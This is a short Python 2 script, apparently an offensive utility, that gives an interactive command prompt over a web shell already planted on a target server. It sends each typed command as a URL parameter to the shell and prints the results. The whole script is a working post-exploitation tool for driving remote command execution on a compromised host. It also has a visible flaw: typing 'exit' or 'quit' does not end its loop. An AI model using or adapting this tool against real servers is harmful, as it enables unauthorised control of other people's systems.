#!/usr/bin/env python

import os
import sys
import requests
import urllib

usage = """
[ CLI Web-Shell - version 1.0 ]
 -----------------------------

 This script provides you with a command line
 interface to a standard RCE web shell. You are
 given pseudo sh prompt, when commands are entered
 an HTTP request is made to the webshell where the
 results are returned and displayed back to your
 terminal session, simulating a standard bindshell.

   usage: ./webcli.py <target shell location>
 example: ./webcli.py http://target.host/shell.php?cmd=

 *note: currently this script only supports shells shown
 in the format above: "target.host/script.blah?var=".
 if you are using a different format for your shell, simply
 edit this script to meet your specifications. it's not hard. 

"""

def shell(url, param):
    while True:
        cmd = raw_input("shell >> ")
        if cmd == "exit" or cmd == "quit":
            print("[*] closing shell ...")
        else:
            p = { param : cmd }
            req = requests.get(url, params=p)
            if req.status_code == 200:
                try:
                    data = req.content.split("\n")
                    for line in data:
                        print line
                except:
                    print req.content

if __name__ == '__main__':
    try:
        target = sys.argv[1]
        if "?" in target:
            url, param = target.split("?")[0], target.split("?")[1].strip("=")
            shell(url, param)
        else:
            print("[error] target URL does not meet format requirements!")
            sys.exit(1)
    except IndexError:
        print(usage)
